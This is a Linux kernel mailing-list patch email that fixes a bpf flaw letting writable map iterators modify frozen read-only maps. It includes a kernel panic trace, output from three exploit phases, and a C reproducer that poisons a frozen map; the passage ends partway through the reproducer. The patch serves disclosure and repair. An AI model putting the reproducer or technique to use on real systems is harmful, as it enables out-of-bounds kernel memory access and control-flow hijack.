Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=52.103.38.33
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1794060939;
	b=o/ExMNKCiqCkuKapzbuqEYZflyyz7elNcrU3Djw3/jhpfxJKH971SNV12gg/MIPAz5Ar
	 YkAErm6LUWFoPUWfjQeUM/b8Mt018Vx1Oyu6HXMCNe5xh49Q4mZpCwkc3+vrAQJ0Ljv+5
	 GCyWYaFk5VRqgavYJR8u9fviTqgrN255GIRxcb/C5/gsoWSQFbPXEh6kZCQTb2LjawLLm
	 OCwzZwMpz+IvsHI+wJFotToPB29LOAQG0m8Sp09HAEIRJsLgQbaf5CDp7EX7/WBI+1aji
	 tTv3wIGcJXv5VHpw/V4jWyz9O8pn0844OJdbglXQfqkk7Hh7oyq3J/mreUQEV+nznRw==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794060939;
	h=DMARC-Filter:DKIM-Signature:Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:Content-Transfer-Encoding:Content-Type:
	 X-ClientProxiedBy:X-Microsoft-Original-Message-ID:MIME-Version:
	 X-MS-Exchange-MessageSentRepresentingType:X-MS-PublicTrafficType:
	 X-MS-TrafficTypeDiagnostic:X-MS-Office365-Filtering-Correlation-Id:
	 X-Microsoft-Antispam:X-Microsoft-Antispam-Message-Info:
	 X-MS-Exchange-AntiSpam-MessageData-ChunkCount:
	 X-MS-Exchange-AntiSpam-MessageData-0:X-OriginatorOrg:
	 X-MS-Exchange-CrossTenant-Network-Message-Id:
	 X-MS-Exchange-CrossTenant-AuthSource:X-MS-Exchange-CrossTenant-AuthAs:
	 X-MS-Exchange-CrossTenant-OriginalArrivalTime:
	 X-MS-Exchange-CrossTenant-FromEntityHeader:
	 X-MS-Exchange-CrossTenant-Id:
	 X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
	 X-MS-Exchange-Transport-CrossTenantHeadersStamped;
	bh=5aw/1wWSlcC9xUbh8lZiRKmbIAk385bFAWhiZDXLnUs=;
	b=DjIMLTxjCs0yhdAksBOCzRUcLTCTN89lgjeZN0zr7ohSYgyH1ZY/XyVlmh93VAlOMNBR
	 W+fskKCqagHZaVXwZ1d6ot5JP6xunkH1zDSH5ZXYzxdrYVj4yaPvgF+Qdwv+0X8iVaPZh
	 td4OiRN6Sp8pnE+Ypr8FS4ATxKkJPBzA/DxeP6zXvwsUAS+c6mRO8IET7u55XjKjERWMd
	 a7tlyJONZAyOr5ibLsHg5XLRwLpz4BLJEeIG4VgvSevKUxeVGydc+TDh3HyJyqqWWJ/L9
	 XgkJ7a6l+bSQLcFn0Lt30zMPpO7I+/LoSExH9QnB0PlgFt6XRgTSiunsGgzw5XXuLJg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=outlook.com;
	spf=pass smtp.mailfrom=outlook.com;
	dkim=pass header.d=outlook.com header.i=@outlook.com header.a=rsa-sha256 header.s=selector1 header.b=VvsbVRhz;
	arc=pass header.oldest-pass=0 smtp.remote-ip=52.103.38.33
Received: from CWXP265CU009.outbound.protection.outlook.com (mail-ukwestazolkn19011033.outbound.protection.outlook.com [52.103.38.33])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange ECDHE (secp384r1) server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C2ABB606D826;
	Sat,  7 Nov 2026 14:15:38 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C2ABB606D826
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=outlook.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=outlook.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=outlook.com header.i=@outlook.com header.a=rsa-sha256 header.s=selector1 header.b=VvsbVRhz
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=Nvxybj/T5cIHWacrvVk4T0r7Fx2H8ZxrgXJE86s8Y6DZ4CCr6a3avcGY1ePk4iRvOMsd3C8QA/bERmvkRT6MHRoW7bwpl948zkACZCIJRpmd/YVOqjMzQTENj1k4gCo1gN66WeBtcZV5VLOeaq4m5ZZ0iVZc+CMd7haeN2FIYbdL1Y6nGLeMrubYzhgamQ+wEQL3Te/tpohJ3LjwEEhSD9pJJwalMJZiXbfjXwSuA9B+v2mWmmZIwwFWuRQSz+PlK76LHcr32LShKHsHIm0w+psMNoczUDhXLgErNcS3WcntZkZD+4dX0Nu4lyPzUJacVEGNPAQjlb2fBRZPyvf6PA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=5aw/1wWSlcC9xUbh8lZiRKmbIAk385bFAWhiZDXLnUs=;
 b=FbYEl8/x6Vll01Yw64KS0jdXt5pmIe0/J9Fzs7nYjeoqkCndVC/qXtBpttURuMvsLPvH9Y4xlq0hryKv1pkhc++wm17bQsnV5wp+1TOIsCdINyGbz4CdDas64SO2GM6xpYcay5npsorgpfHzG241N++lBZkMLgwjwi9GyM29nszLoxat6M8y4ohPOiRgBZnRHzdosgLcxXhBAqw8k7Oq0gPbe6H2ZilN9tNZb9mm3ww6eQJjPXYu1fB94LYz5wHAGhj1iYGhCGoIcnb7IMSNCFStFzZnn+4wSvljnu+fGF5O9SytGiHh+PFsf1iy4fwFlLZgny+g772T/mPFCv1IIg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=5aw/1wWSlcC9xUbh8lZiRKmbIAk385bFAWhiZDXLnUs=;
 b=VvsbVRhzU16I8LZHd36kLtOAdXl2tTYaWL3oDPbKrdg1mdz7xDd7PUs94xUc5iCy3oyehAFBVjfaoLieYZ8IV/bz9GFcRC+OdWG76wF5sH1WUlfnGs2V4Ee7C+HZUz16ryFMepwAZRn9cTDawz96uSwzW1gjtFRVwFyJVKvUbvCcx/YdMLbKyEXy8xQFv90e1kAd9H2H7QTf3ln0DA+8aupbgFYPGkE3PX2M6rC9GedLC0bJL2n/VQCtB4fXC4U8swcKCQsk9wtGJ6Ii7tylqXHhITt32fKyVeNYAG2RUN0hTgxa3bP777MZg8uEWIKafi6S1phwUMAmVDddWXDs8w==
Received: from LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM (2603:10a6:600:378::12)
 by CW1P302MB1871.GBRP302.PROD.OUTLOOK.COM (2603:10a6:400:257::5) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.592.11; Sat, 7 Nov
 2026 14:15:36 +0000
Received: from LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM
 ([fe80::fa56:cf9e:33cf:e1b4]) by LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM
 ([fe80::fa56:cf9e:33cf:e1b4%6]) with mapi id 15.21.0592.010; Sat, 7 Nov 2026
 14:15:36 +0000
From: AdetsGithub <adethyasrinivasan@outlook.com>
To: Yonghong Song <yonghong.song@linux.dev>,
	Alexei Starovoitov <ast@kernel.org>,
	Daniel Borkmann <daniel@iogearbox.net>,
	Andrii Nakryiko <andrii@kernel.org>,
	Eduard Zingerman <eddyz87@gmail.com>,
	Kumar Kartikeya Dwivedi <memxor@gmail.com>
Cc: bpf@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Adethya Srinivasan <adethyasrinivasan@outlook.com>
Subject: [PATCH bpf] bpf: Reject writable map iterators on read-only and frozen maps
Date: Sat,  7 Nov 2026 14:14:57 +0000
Message-ID:
 <LO2P302MB0197FAF0305A94F7575CA700BC752@LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM>
X-Mailer: git-send-email 2.53.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain
X-ClientProxiedBy: LO4P123CA0663.GBRP123.PROD.OUTLOOK.COM
 (2603:10a6:600:316::10) To LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM
 (2603:10a6:600:378::12)
X-Microsoft-Original-Message-ID:
 <20261107141457.99590-1-adethyasrinivasan@outlook.com>
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: LO2P302MB0197:EE_|CW1P302MB1871:EE_
X-MS-Office365-Filtering-Correlation-Id: a7f6bbaf-0f32-44bf-c2cb-08df3cd9977f
X-Microsoft-Antispam:
	BCL:0;ARA:14566002|260925184616899003|5072599009|5062599005|12121999013|23021999003|15080799012|22141099003|4140399003|19110799012|41001999006|25010399006|24021099003|39105399006|8060799015|40105399003|440099028|3412199025|1710799026;
X-Microsoft-Antispam-Message-Info:
	=?us-ascii?Q?SINN+Re4m6mnjBtK3RTQw0vVyyVJRoeTV/tx3DzD7JRBWvE6h3GHO+72jDQW?=
 =?us-ascii?Q?JqN4TWJ/jYtXj1ubB6ZUjasbSfnaF7TFTq7lqI5n8qhvCtCBEo5P75acHA85?=
 =?us-ascii?Q?aLturAVQCgdjBXb/Y19tDfpO0VJKKDFcLQC314fudStCljW8lt2cfeL9N4GG?=
 =?us-ascii?Q?M70qpu9/4DUkykfv4PFQfe7iSq0uwy0Emulu2akWbC7Rv9gNR/yVAKaEE58E?=
 =?us-ascii?Q?x7P/chciJP/UTuBaFSFrscYpvKQL+GQbNRfSDzhL/vW8KrL9+XsVZrmkUw7/?=
 =?us-ascii?Q?8cgmRj1bLlr91tEcs5u4frXAm4Mj3suQ4MGqfAdQkm7PuLzxm6viYN9Bq1F8?=
 =?us-ascii?Q?tQF1zvaBfBMfIf8SUY86ywyiXCMBVIakkLzsDbVLsvdGtB8DT5kFQRQXCwXG?=
 =?us-ascii?Q?zUq6MwUKvbkTNCogQOs2vUB6EfnptlvEzsgdDR4uvekBJuuhLiBEGn1fpzwd?=
 =?us-ascii?Q?jBhAxRUSb+FSQmhEpJ0jYbU+WhPnQ/qN/S3DpMEmm8MHONk1UkaM8mYMQvXF?=
 =?us-ascii?Q?Lv4c77eSLDkzZQOg5eiBzZtfa4+1eEGwrrNjdMGLfRrSjlIwzglVckzwGNU6?=
 =?us-ascii?Q?jCHes7E4rxV42JD+XE7EIY4sRQNM7C6cGj+61w8Fppo74jt017YQSn2Wxx3N?=
 =?us-ascii?Q?EdQr/uOecpyvB/9wYPdabZAi4FobLv5qMPh76zC9WhrClAIr4mzHYwM1nQHH?=
 =?us-ascii?Q?gnluszEntj5sWWtVtTxl7oVEMu5EwzWHairOf5vdfIycFLPTgjBN9pb8xiyK?=
 =?us-ascii?Q?TG7FsVBkN94XrLJVGA/b0q0bTAlmi6vynNrKC1ktTbzJpuTM0+hs3guUxm5C?=
 =?us-ascii?Q?DnCYFIogm8zmL+Z0ZsK8OihzkcI6zWHAmbmyO6EcBv8blWzP4kRbRTNZx6M6?=
 =?us-ascii?Q?JPklNEjOvEuH15VwNjbehwXxiv6l4ykTI5ZxzIS+1Pi28jPBHcsgSqu/fCku?=
 =?us-ascii?Q?0V44v2DvMCmh9bqc54OKQIzBMetIS2+uoCTMHkGI8on0Vb9K2D/W12ZaOatT?=
 =?us-ascii?Q?LXhH+e/Wv+SycqwHHchwbp0wLuUp06wOTBv0VdJIHXs8oFcdCvqlh4oK4tKf?=
 =?us-ascii?Q?GlYop+Yv7yZp7e5nVVU35Dy1R4v0rg=3D=3D?=
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?us-ascii?Q?Sw6pqOy/4va9C8YHMhTSM/DVXe8g4zkKVN4b8opScUFTqoqEbelrnGrjde5u?=
 =?us-ascii?Q?L8ZMAe9i/pL82sE1hQNsKGinbN+s+4V6WwuOd5L4sDfRW9gVZuZlVUHN8s0N?=
 =?us-ascii?Q?4hNALg3UYhaaOCDWaB1YK44k/KEPeeP1xiXg9cN+DsT+Ek7hjm9na9+WADNC?=
 =?us-ascii?Q?k2J4GLdY+J8Xob2np5VkA2CP/ydfBFP5i335NjY1PlQ2NHDuNFNN/+f3wvw3?=
 =?us-ascii?Q?SIaoMIop2ARfHalCDvvec3elrDIdoC/3Wg+tLg6fXtaRK5OAOR0xoYYwEEQW?=
 =?us-ascii?Q?+u7FadxiKVjMQtQaAlYycYep7jGpjo9EUsUhlktSqFCPqrklj/Ahxj8WwSae?=
 =?us-ascii?Q?TCpCgQVqm73BvSw2KBJqTEIyN2Ix1jUVhYZnrs/eWa2sWaahr9fP5H1Ulx8z?=
 =?us-ascii?Q?7FVCd+Tp01TGMLxmMgQWBTlFL4WneoH9xrd+L7b9QCORD245UzkT+i5BvZ7X?=
 =?us-ascii?Q?SAGJWkfDihO2sFTzwpljJhM5oFyi2zps8Z1AmBnJ6YvixnqIDU1jQZ6qc4Od?=
 =?us-ascii?Q?xpvmXJNMXzqCL0QK7u9+he7jREu3oi2GtUFNASseKiaJHiNwlGn2rE+m24iT?=
 =?us-ascii?Q?rFotb+OYhEVzXTXDoJHc4RW4vCShaPzNvutv9XX53MDK/BQSYoiN6RJZUp2W?=
 =?us-ascii?Q?t+el/xyX2hmH2zi2N9NxEyC2dCVAVRLsgEJyXzOFI7hIRCg6lDAAXAE2ptbP?=
 =?us-ascii?Q?BY6cRv8phCZwnNzrdH27qu5A2SRujZfS+ZX/VKNGmvpj28NqLfJwzCSeZsXE?=
 =?us-ascii?Q?gpfFqHQ4NRbJ0ze71KhzaeDPnrNFe5qipja3RNVmfIlU8e/0FOWeV10NN34Z?=
 =?us-ascii?Q?DWmThzgaeo0sGNmncqwX+iMZE9SorDzjIzO6Bo5aMtPUSBpTeorFGoppIhdZ?=
 =?us-ascii?Q?hyyHhWpArXkOG30z7JIDh/yOfTsb3DQLjzWF5KHKJ6LAP7qqjXQdO751nOt8?=
 =?us-ascii?Q?OcwMWvkpQKKqbn7aot8T+3gwqzptm/rivA6MSIGpNTEuxlR2RTmF/KH6TvoP?=
 =?us-ascii?Q?HKt3fwyBcvlS4LUxsjHS4DV5qd4JZth6HhBy3nYkMrfNCV5htiX0b3K8glaC?=
 =?us-ascii?Q?1laIYFw4lM9AAgPNGEWYIxO8dWkaNHgA/hkRJWRkFry8WnQOsqXlU126thsF?=
 =?us-ascii?Q?btc/v2hNGog2vPRber4QwSsRoyuazB73RizER3Lx/yy5Uvhv9rzyNSiaS01U?=
 =?us-ascii?Q?E2dS99btj08XN9u7A5yQWfqu+moHNWo8y6jXrn7BHBZAulTDBs753ati7hf0?=
 =?us-ascii?Q?oD7qi/4KKAW4GiynU+WmP3bmNXdjTtdmfKaV5GFx65tlvE6veQoKpaMefqP0?=
 =?us-ascii?Q?AMME35MmopIGDHjdPZpyL61A/Z8h0+3llxggmDla6aIbaJc99EzrX938IZDm?=
 =?us-ascii?Q?n1jkCLGE3ZuJN1N/ljuIAlfFeQr+P4G2cCw6Fwvky1QMjNj/+Q=3D=3D?=
X-OriginatorOrg: outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: a7f6bbaf-0f32-44bf-c2cb-08df3cd9977f
X-MS-Exchange-CrossTenant-AuthSource: LO2P302MB0197.GBRP302.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 07 Nov 2026 14:15:36.1234
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
	00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CW1P302MB1871

From: Adethya Srinivasan <adethyasrinivasan@outlook.com>

The bpf_map_elem and bpf_sk_storage_map iterators pass the live element
value (ctx->value) to the iterator program as a writable buffer
(PTR_TO_BUF | PTR_MAYBE_NULL) for all non-percpu map types. Since
commit 8d0358f6e8b3 ("bpf: Keep iterator programs off special map
fields"), bpf_iter_map_check_value_write() checks on Linux 7.4.0-rc1
whether a writable iterator program (prog->aux->max_rdwr_write > 0)
overlaps special BTF fields in map->record, but does not check whether
the target map has BPF_F_RDONLY_PROG set or has been frozen via
BPF_MAP_FREEZE (map->frozen).

As a result, a writable bpf_map_elem iterator can be attached to a
frozen BPF_F_RDONLY_PROG map (such as a .rodata BPF_MAP_TYPE_ARRAY or
BPF_MAP_TYPE_HASH) and triggered via read(iter_fd) to mutate its elements
in place after dependent BPF programs have already been verified.

Why this breaks verifier soundness:
1. Constant folding (check_map_load / const_fold.c): When
   bpf_map_is_rdonly(map) is true ((map->map_flags & BPF_F_RDONLY_PROG)
   && READ_ONCE(map->frozen) && !bpf_map_write_active(map)), the verifier
   folds direct loads from single-entry array maps into compile-time
   scalar constants (__mark_reg_known). Overwriting the frozen element
   via a bpf_map_elem iterator causes the runtime value to diverge from
   the verifier's folded constant, bypassing bounds checks on pointer
   arithmetic (PTR_TO_MAP_VALUE += scalar) in already-loaded programs
   and enabling out-of-bounds map reads and writes.
2. Indirect subprogram calls (find_subprog / callx): Function pointer
   tables in frozen BPF_F_RDONLY_PROG maps are resolved to live kernel
   JIT addresses at load time. Mutating the frozen slot via a
   bpf_map_elem iterator redirects indirect callx targets at runtime
   (or crashes the kernel at an arbitrary RIP such as RIP = 0x0).

Threat model evaluation (Documentation/process/threat-model.rst):
Triggering this issue requires attaching a tracing iterator program
(BPF_PROG_TYPE_TRACING / BPF_TRACE_ITER), which requires CAP_BPF and
CAP_PERFMON (or CAP_SYS_ADMIN, or a delegated BPF token). In deployments
where CAP_BPF + CAP_PERFMON or a BPF token is granted without full root /
CAP_SYS_ADMIN, the BPF verifier is the boundary preventing out-of-bounds
kernel memory access and arbitrary kernel RIP control.

In bpf_iter_map_check_value_write(), return 0 early when
!prog->aux->max_rdwr_write so read-only iterators (such as bpftool map
dump) remain permitted, and reject maps with
(map->map_flags & BPF_F_RDONLY_PROG) or READ_ONCE(map->frozen) with
-EACCES before checking map->record.

Fixes: 8d0358f6e8b3 ("bpf: Keep iterator programs off special map fields")
Fixes: d3cc2ab546ad ("bpf: Implement bpf iterator for array maps")
Fixes: d6c4503cc296 ("bpf: Implement bpf iterator for hash maps")
Fixes: 5ce6e77c7edf ("bpf: Implement bpf iterator for sock local storage map")
Signed-off-by: Adethya Srinivasan <adethyasrinivasan@outlook.com>
---
Supporting Information (per Documentation/admin-guide/reporting-issues.rst):

1. Environment & Kernel Version
-------------------------------
- Kernel version: Linux 7.4.0-rc1
- Commit: a91337fb5e8e0127c8b5be87be9f3027f95b48bc (torvalds/linux master)
- Guest uname -a:
  Linux (none) 7.4.0-rc1-ga91337fb5e8e-dirty #2 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
- Compiler & Linker:
  gcc (Ubuntu 15.2.0-16ubuntu1) 15.2.0 / GNU ld (GNU Binutils for Ubuntu) 2.46
- Virtualization / Hardware:
  QEMU/KVM x86_64 (QEMU Ubuntu 26.04 PC i440FX + PIIX, 4 vCPUs, 4 GiB RAM)
- Relevant Kernel Configuration:
  CONFIG_BPF=y
  CONFIG_BPF_SYSCALL=y
  CONFIG_BPF_JIT=y
  CONFIG_BPF_JIT_ALWAYS_ON=y
  CONFIG_DEBUG_INFO_BTF=y
  CONFIG_BPF_EVENTS=y

2. Kernel Oops / Panic Trace (Phase 3: callx slot poisoned with 0x0 via iter)
-----------------------------------------------------------------------------
When a frozen BPF_F_RDONLY_PROG array map holding resolved subprogram
addresses for callx is overwritten with 0x0 via an iter/bpf_map_elem
program, the next bpf_prog_test_run jumps to RIP = 0x0 in supervisor mode:

[    2.206756] BUG: kernel NULL pointer dereference, address: 0000000000000000
[    2.208642] #PF: supervisor instruction fetch in kernel mode
[    2.210161] #PF: error_code(0x0010) - not-present page
[    2.211586] PGD 0 P4D 0
[    2.212467] Oops: Oops: 0010 [#1] SMP NOPTI
[    2.213677] CPU: 2 UID: 0 PID: 131 Comm: test_progs Tainted: G           OE       7.4.0-rc1-ga91337fb5e8e-dirty #2 PREEMPT(full)
[    2.216684] Tainted: [O]=OOT_MODULE, [E]=UNSIGNED_MODULE
[    2.218417] Hardware name: QEMU Ubuntu 26.04 PC (i440FX + PIIX, 1996), BIOS 1.17.0-debian-1.17.0-1ubuntu1 04/01/2014
[    2.221558] RIP: 0010:0x0
[    2.222602] Code: Unable to access opcode bytes at 0xffffffffffffffd6.
[    2.224465] RSP: 0018:ffff9a1b40a47b40 EFLAGS: 00010202
[    2.225995] RAX: ffffffffc0200768 RBX: ffff8fbb42073900 RCX: ffff8fbb42073900
[    2.227953] RDX: 0000000000000246 RSI: 0000000000000000 RDI: 000000000000000a
[    2.229738] RBP: ffff9a1b40a47b48 R08: 0000000000000000 R09: 0000000000000001
[    2.231506] R10: 0000000000000001 R11: ffff8fbb42074448 R12: ffff9a1b401f2000
[    2.233284] R13: ffff9a1b40a47be0 R14: ffff9a1b40a47bc8 R15: ffff8fbb40bd9800
[    2.235046] FS:  00007fd7dbc82940(0000) GS:ffff8fbbe5d7e000(0000) knlGS:0000000000000000
[    2.236977] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.238445] CR2: ffffffffffffffd6 CR3: 000000010321c004 CR4: 0000000000770ef0
[    2.240044] PKRU: 55555554
[    2.240624] Call Trace:
[    2.241129]  <TASK>
[    2.241590]  bpf_prog_201991bb12c96cf7_main_prog+0x28/0x2a
[    2.242674]  bpf_test_run+0x1ff/0x440
[    2.243403]  ? bpf_test_run+0x11f/0x440
[    2.244194]  bpf_prog_test_run_skb+0x634/0xba0
[    2.245117]  ? lock_release+0xd1/0x2e0
[    2.245885]  __sys_bpf+0x11d7/0x3260
[    2.246622]  ? anon_pipe_write+0x2ce/0x730
[    2.247437]  ? __x64_sys_bpf+0x30/0x40
[    2.248194]  __x64_sys_bpf+0x30/0x40
[    2.248933]  do_syscall_64+0xb2/0x550
[    2.249679]  ? __irq_exit_rcu+0x2f/0x130
[    2.250480]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    2.264423]  </TASK>
[    2.264890] Modules linked in: bpf_testmod(OE)
[    2.265785] CR2: 0000000000000000
[    2.266455] ---[ end trace 0000000000000000 ]---
[    2.267395] Kernel panic - not syncing: Fatal exception in interrupt
[    2.283591] Kernel Offset: 0x12000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    2.285658] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---

3. Verification Output Before & After Patch
-------------------------------------------
A) Unpatched 7.4.0-rc1 (a91337fb5e8e) -- all 3 exploit phases succeed:
  ./test_progs -v -t frozen_rdonly_iter_write
  F phase-1: syscall update after freeze denied (Operation not permitted)
  F phase-1 CONFIRMED: wrote 0xdeadbeefcafebabe into frozen RDONLY_PROG ARRAY via bpf_map_elem iter
  #171/1   frozen_rdonly_iter_write/phase1_iter_write_frozen:OK
  F phase-2: victim accepted with frozen rdonly scalar known=0
  F phase-2 CONFIRMED: accepted prog read data[1] after poisoning frozen rdonly offset 0->8 (verifier assumed constant 0)
  F phase-2 control: reload with *ro==8 rejected (expected)
  F phase-2 WRITE CONFIRMED: corrupted data[1]=0xdeadbeefcafebabe via under-bounded PTR_TO_MAP_VALUE
  #171/2   frozen_rdonly_iter_write/phase2_const_scalar_oob:OK
  F phase-3: resolved add1=ffffffffc0400720 add2=ffffffffc0400758
  F phase-3: pre-hijack retval=13
  F phase-3 CONFIRMED: callx hijack via iter write to frozen func-ptr map (retval 13->14).
  #171/3   frozen_rdonly_iter_write/phase3_callx_hijack:OK
  #171     frozen_rdonly_iter_write:OK

B) Patched 7.4.0-rc1 -- writable iterator rejected with -EACCES on all phases:
  ./test_progs -v -t frozen_rdonly_iter_write
  F phase-1: syscall update after freeze denied (Operation not permitted)
  libbpf: prog 'poison_frozen_map': failed to attach to iterator: -EACCES
  run_poison_iter:FAIL:attach iter to frozen map unexpected error: -13
  #171/1   frozen_rdonly_iter_write/phase1_iter_write_frozen:FAIL
  F phase-2: victim accepted with frozen rdonly scalar known=0
  libbpf: prog 'poison_frozen_map': failed to attach to iterator: -EACCES
  run_poison_iter:FAIL:attach iter to frozen map unexpected error: -13
  #171/2   frozen_rdonly_iter_write/phase2_const_scalar_oob:FAIL
  F phase-3: resolved add1=ffffffffc020099c add2=ffffffffc02009cc
  F phase-3: pre-hijack retval=13
  libbpf: prog 'poison_frozen_map': failed to attach to iterator: -EACCES
  run_poison_iter:FAIL:attach iter to frozen map unexpected error: -13
  #171/3   frozen_rdonly_iter_write/phase3_callx_hijack:FAIL

4. Minimal Standalone C Reproducer (frozen_rdonly_iter_write.c)
---------------------------------------------------------------
Build: gcc -O2 -Wall frozen_rdonly_iter_write.c -lbpf -o frozen_rdonly_iter_write
Run:   sudo ./frozen_rdonly_iter_write

/* SPDX-License-Identifier: GPL-2.0 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <linux/bpf.h>

#ifndef BPF_F_RDONLY_PROG
#define BPF_F_RDONLY_PROG	(1U << 7)
#endif

#define SAFE_VAL	0x11111111ull
#define POISON_VAL	0xdeadbeefcafebabeull
#define CTX_VALUE_OFF	24

#ifndef BPF_MOV64_REG
#define BPF_MOV64_REG(DST, SRC) \
	((struct bpf_insn){ .code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC })
#define BPF_MOV64_IMM(DST, IMM) \
	((struct bpf_insn){ .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .imm = IMM })
#define BPF_LDX_MEM(SZ, DST, SRC, OFF) \
	((struct bpf_insn){ .code = BPF_LDX | (SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF })
#define BPF_STX_MEM(SZ, DST, SRC, OFF) \
	((struct bpf_insn){ .code = BPF_STX | (SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF })
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
	((struct bpf_insn){ .code = BPF_JMP | (OP) | BPF_K, .dst_reg = DST, .off = OFF, .imm = IMM })
#define BPF_LD_IMM64(DST, IMM) \
	((struct bpf_insn){ .code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .imm = (__u32)(IMM) }), \
	((struct bpf_insn){ .imm = (__u32)((__u64)(IMM) >> 32) })
#define BPF_EXIT_INSN() \
	((struct bpf_insn){ .code = BPF_JMP | BPF_EXIT })
#endif

static int load_poison_iter(void)
{
	struct bpf_insn insns[] = {
		BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, CTX_VALUE_OFF),
		BPF_JMP_IMM(BPF_JEQ, BPF_REG_1, 0, 3),
		BPF_LD_IMM64(BPF_REG_2, POISON_VAL),
		BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	LIBBPF_OPTS(bpf_prog_load_opts, opts,
		    .expected_attach_type = BPF_TRACE_ITER);

	opts.attach_btf_id = libbpf_find_vmlinux_btf_id("bpf_map_elem",
							BPF_TRACE_ITER);
	if (opts.attach_btf_id <= 0)
		return -1;

	return bpf_prog_load(BPF_PROG_TYPE_TRACING, "poison_iter", "GPL",
			     insns, sizeof(insns) / sizeof(insns[0]), &opts);
}

int main(void)
{
	LIBBPF_OPTS(bpf_map_create_opts, mopts, .map_flags = BPF_F_RDONLY_PROG);
	LIBBPF_OPTS(bpf_iter_attach_opts, iopts);
	union bpf_iter_link_info linfo = {};
	__u32 key = 0;
	__u64 val = SAFE_VAL, out = 0;
	int map_fd = -1, prog_fd = -1, link_fd = -1, iter_fd = -1;
	char buf[64];
	int err, ret = 1;
	ssize_t n;

	map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, "f_ro", sizeof(key),
				sizeof(val), 1, &mopts);
	if (map_fd < 0)
		return 1;

	if (bpf_map_update_elem(map_fd, &key, &val, BPF_ANY) ||
	    bpf_map_freeze(map_fd))
		goto out;

	val = 0x22222222ull;
	err = bpf_map_update_elem(map_fd, &key, &val, BPF_ANY);
	if (!err)
		goto out;
	printf("[+] syscall update after freeze denied (%s)\n", strerror(errno));

	prog_fd = load_poison_iter();
	if (prog_fd < 0)
		goto out;

	linfo.map.map_fd = map_fd;
	iopts.link_info = &linfo;
	iopts.link_info_len = sizeof(linfo);
